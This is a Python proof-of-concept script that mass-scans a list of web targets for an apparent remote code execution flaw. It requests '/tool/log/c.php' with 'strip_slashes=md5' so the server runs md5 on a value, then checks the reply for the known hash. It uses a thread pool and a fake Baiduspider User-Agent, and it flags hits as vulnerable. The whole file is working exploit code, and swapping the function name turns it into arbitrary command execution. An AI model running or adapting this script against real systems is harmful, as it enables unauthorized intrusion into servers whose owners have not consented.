#!/usr/bin/env python
# -*- coding: utf-8 -*-
import logging
import requests
import threadpool

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__file__)



def check_vul(url):
    """check vul"""
    if not url.endswith("/"):
        url += '/'

    target = "{}tool/log/c.php?strip_slashes=md5&host=123456".format(url)

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"}

    try:
        response = requests.get(url=target, headers=headers, timeout=6)
        text = response.text
    except BaseException as e:
        text = ''

    if "e10adc3949ba59abbe56e057f20f883e" in text:
        logger.info("\033[1;32m[*] {} 存在漏洞！\033[0m".format(url))


def create_vars(urls):
    """create vars"""
    var_list = []

    for u in urls:
        u = u.strip()
        new_data = {"url": u}
        var_list.append((None, new_data))

    return var_list


def run(thread_num, var_list):
    if not isinstance(var_list, list):
        logger.error(str(var_list) + " is not list!")
        return
    pool = threadpool.ThreadPool(int(thread_num))
    tasks = threadpool.makeRequests(check_vul, var_list)
    [pool.putRequest(task) for task in tasks]
    pool.poll()
    pool.wait()


def main(url, url_file, thread_num):
    """main"""
    if url_file:
        with open(url_file, "r") as f:
            urls = f.readlines()
    elif url:
        urls = [url]
    else:
        urls = []
        logger.error("\033[1;31m[-] No target!\033[0m")
        exit()

    var_list = create_vars(urls)
    run(thread_num, var_list)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        dest="url",
        default="",
        help="Test url")
    parser.add_argument(
        "-f",
        "--file",
        dest="url_file",
        default="",
        help="Test url list")
    parser.add_argument(
        "-t",
        "--thread",
        dest="thread_num",
        default="1",
        help="Thread num")
    args = parser.parse_args()
    main(args.url, args.url_file, args.thread_num)
